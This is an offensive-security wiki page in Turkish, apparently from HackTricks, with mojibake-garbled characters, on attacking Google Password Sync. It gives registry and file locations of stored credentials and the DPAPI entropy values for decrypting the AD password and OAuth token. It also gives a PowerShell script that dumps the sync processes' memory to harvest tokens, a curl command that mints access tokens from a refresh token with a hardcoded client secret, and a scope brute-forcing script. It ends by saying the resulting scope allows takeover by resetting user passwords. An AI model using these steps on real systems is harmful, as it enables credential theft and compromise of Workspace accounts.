# GPS - Google Password Sync

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## Temel Bilgiler

Bu, Google'Ä±n **AD** ve Workspace arasÄ±ndaki kullanÄ±cÄ±larÄ±n ÅŸifrelerini **senkronize tutmak** iÃ§in sunduÄŸu ikili dosya ve hizmettir. Bir kullanÄ±cÄ± AD'de ÅŸifresini her deÄŸiÅŸtirdiÄŸinde, bu Google'a ayarlanÄ±r.

`C:\Program Files\Google\Password Sync` dizinine kurulur; burada yapÄ±landÄ±rmak iÃ§in `PasswordSync.exe` ikili dosyasÄ±nÄ± ve Ã§alÄ±ÅŸmaya devam edecek olan `password_sync_service.exe` (hizmet) dosyasÄ±nÄ± bulabilirsiniz.

### GPS - YapÄ±landÄ±rma

Bu ikili dosyayÄ± (ve hizmeti) yapÄ±landÄ±rmak iÃ§in, **Workspace'de bir SÃ¼per YÃ¶netici yetkisi** vermek gereklidir:

* Google ile **OAuth** Ã¼zerinden giriÅŸ yapÄ±n ve ardÄ±ndan **kayÄ±t defterinde (ÅŸifreli) bir token saklayacaktÄ±r**
* Sadece GUI'ye sahip Alan Denetleyicilerinde mevcuttur
* **Workspace kullanÄ±cÄ±larÄ±nÄ± yÃ¶netme** yetkisine sahip bazÄ± **GCP Hizmet HesabÄ± kimlik bilgileri** (json dosyasÄ±) vermek
* Bu Ã§ok kÃ¶tÃ¼ bir fikirdir Ã§Ã¼nkÃ¼ bu kimlik bilgileri asla sÃ¼resi dolmaz ve kÃ¶tÃ¼ye kullanÄ±labilir
* Workspace Ã¼zerinde bir SA'ya eriÅŸim vermek Ã§ok kÃ¶tÃ¼ bir fikirdir Ã§Ã¼nkÃ¼ SA GCP'de tehlikeye girebilir ve Workspace'e geÃ§iÅŸ yapmak mÃ¼mkÃ¼n olacaktÄ±r
* Google, GUI'siz alan denetimleri iÃ§in bunu gerektirir
* Bu kimlik bilgileri de kayÄ±t defterinde saklanÄ±r

AD ile ilgili olarak, mevcut **uygulama baÄŸlamÄ±nÄ±, anonim veya bazÄ± Ã¶zel kimlik bilgilerini** kullanmasÄ±nÄ± belirtmek mÃ¼mkÃ¼ndÃ¼r. Kimlik bilgileri seÃ§eneÄŸi seÃ§ilirse, **kullanÄ±cÄ± adÄ±** bir dosyada **diskte** saklanÄ±r ve **ÅŸifre** **ÅŸifrelenir** ve **kayÄ±t defterinde** saklanÄ±r.

### GPS - Diskten ÅŸifre ve token dÃ¶kme

{% hint style="success" %}
[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) **GPS**'yi tespit edebilir, yapÄ±landÄ±rma hakkÄ±nda bilgi alabilir ve **ÅŸifreyi ve token'Ä± bile ÅŸifreleyebilir**.
{% endhint %}

**`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** dosyasÄ±nda, yapÄ±landÄ±rmanÄ±n bir kÄ±smÄ±nÄ± bulmak mÃ¼mkÃ¼ndÃ¼r; burada yapÄ±landÄ±rÄ±lan AD'nin **`baseDN`** ve kullanÄ±lan kimlik bilgileri olan **`username`** yer alÄ±r.

KayÄ±t defterinde **`HKLM\Software\Google\Google Apps Password Sync`** altÄ±nda, **ÅŸifrelenmiÅŸ yenileme token'Ä±** ve AD kullanÄ±cÄ±sÄ± iÃ§in **ÅŸifrelenmiÅŸ ÅŸifre** (varsa) bulunabilir. AyrÄ±ca, bir token yerine bazÄ± **SA kimlik bilgileri** kullanÄ±lÄ±yorsa, bu kimlik bilgileri de o kayÄ±t defteri adresinde ÅŸifrelenmiÅŸ olarak bulunabilir. Bu kayÄ±t defterindeki **deÄŸerler** yalnÄ±zca **YÃ¶netici** tarafÄ±ndan **eriÅŸilebilir**.

ÅifrelenmiÅŸ **ÅŸifre** (varsa) **`ADPassword`** anahtarÄ±nÄ±n iÃ§indedir ve **`CryptProtectData`** API'si kullanÄ±larak ÅŸifrelenmiÅŸtir. Åifreyi Ã§Ã¶zmek iÃ§in, ÅŸifre senkronizasyonunu yapÄ±landÄ±ran kullanÄ±cÄ± ile aynÄ± kullanÄ±cÄ± olmanÄ±z ve **`CryptUnprotectData`** kullanÄ±rken bu **entropy**'yi kullanmanÄ±z gerekir: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

ÅifrelenmiÅŸ token (varsa) **`AuthToken`** anahtarÄ±nÄ±n iÃ§indedir ve **`CryptProtectData`** API'si kullanÄ±larak ÅŸifrelenmiÅŸtir. Åifreyi Ã§Ã¶zmek iÃ§in, ÅŸifre senkronizasyonunu yapÄ±landÄ±ran kullanÄ±cÄ± ile aynÄ± kullanÄ±cÄ± olmanÄ±z ve **`CryptUnprotectData`** kullanÄ±rken bu **entropy**'yi kullanmanÄ±z gerekir: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
AyrÄ±ca, bu deÄŸerler **`0123456789abcdefghijklmnopqrstv`** sÃ¶zlÃ¼ÄŸÃ¼ ile base32hex kullanÄ±larak kodlanmÄ±ÅŸtÄ±r.

Entropy deÄŸerleri, aracÄ± kullanarak bulunmuÅŸtur. AraÃ§, **`CryptUnprotectData`** ve **`CryptProtectData`** Ã§aÄŸrÄ±larÄ±nÄ± izlemek iÃ§in yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r ve ardÄ±ndan `PasswordSync.exe`'yi baÅŸlatmak ve izlemek iÃ§in kullanÄ±lmÄ±ÅŸtÄ±r; bu, yapÄ±landÄ±rÄ±lan ÅŸifreyi ve kimlik doÄŸrulama token'Ä±nÄ± baÅŸta Ã§Ã¶zmekte ve araÃ§, her iki durumda kullanÄ±lan **entropy** deÄŸerlerini **gÃ¶sterecektir**:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

AyrÄ±ca, bu API'lere yapÄ±lan Ã§aÄŸrÄ±larÄ±n giriÅŸ veya Ã§Ä±kÄ±ÅŸÄ±nda **ÅŸifrelenmiÅŸ** deÄŸerleri gÃ¶rmek de mÃ¼mkÃ¼ndÃ¼r (eÄŸer bir noktada Winpeas Ã§alÄ±ÅŸmayÄ± durdurursa).

EÄŸer Åifre Senkronizasyonu **SA kimlik bilgileri** ile yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, bu da kayÄ±t defterinde **`HKLM\Software\Google\Google Apps Password Sync`** anahtarlarÄ± iÃ§inde saklanacaktÄ±r.

### GPS - Bellekten token dÃ¶kme

GCPW ile olduÄŸu gibi, `PasswordSync.exe` ve `password_sync_service.exe` sÃ¼reÃ§lerinin belleÄŸini dÃ¶kmek mÃ¼mkÃ¼ndÃ¼r ve yenileme ve eriÅŸim token'larÄ±nÄ± bulabileceksiniz (eÄŸer zaten oluÅŸturulmuÅŸlarsa).\
AyrÄ±ca, AD yapÄ±landÄ±rÄ±lmÄ±ÅŸ kimlik bilgilerini de bulabilirsiniz.

<details>

<summary>Dump <code>PasswordSync.exe</code> ve <code>password_sync_service.exe</code> sÃ¼reÃ§lerini ve token'larÄ± arayÄ±n</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - Yenileme jetonlarÄ±ndan eriÅŸim jetonlarÄ± oluÅŸturma

Yenileme jetonunu kullanarak, aÅŸaÄŸÄ±daki komutta belirtilen istemci kimliÄŸi ve istemci sÄ±rrÄ±nÄ± kullanarak eriÅŸim jetonlarÄ± oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Kapsamlar

{% hint style="info" %}
Bir refresh token'a sahip olsanÄ±z bile, eriÅŸim token'Ä± iÃ§in herhangi bir kapsam talep etmenin mÃ¼mkÃ¼n olmadÄ±ÄŸÄ±nÄ± unutmayÄ±n, Ã§Ã¼nkÃ¼ yalnÄ±zca **eriÅŸim token'Ä±nÄ± oluÅŸturduÄŸunuz uygulama tarafÄ±ndan desteklenen kapsamlarÄ± talep edebilirsiniz**.

AyrÄ±ca, refresh token her uygulamada geÃ§erli deÄŸildir.
{% endhint %}

VarsayÄ±lan olarak GPS, kullanÄ±cÄ± olarak her olasÄ± OAuth kapsamÄ±na eriÅŸime sahip olmayacaktÄ±r, bu nedenle aÅŸaÄŸÄ±daki script'i kullanarak `refresh_token` ile bir `access_token` oluÅŸturmak iÃ§in kullanÄ±labilecek kapsamlarÄ± bulabiliriz:

<details>

<summary>KapsamlarÄ± brute-force yapmak iÃ§in Bash script'i</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Ve yazma anÄ±nda aldÄ±ÄŸÄ±m Ã§Ä±ktÄ±:
```
https://www.googleapis.com/auth/admin.directory.user
```
Hangi, herhangi bir kapsam belirtmediÄŸinizde aldÄ±ÄŸÄ±nÄ±zla aynÄ±dÄ±r.

{% hint style="danger" %}
Bu kapsam ile **mevcut bir kullanÄ±cÄ±nÄ±n ÅŸifresini deÄŸiÅŸtirerek ayrÄ±calÄ±klarÄ± artÄ±rabilirsiniz**.
{% endhint %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
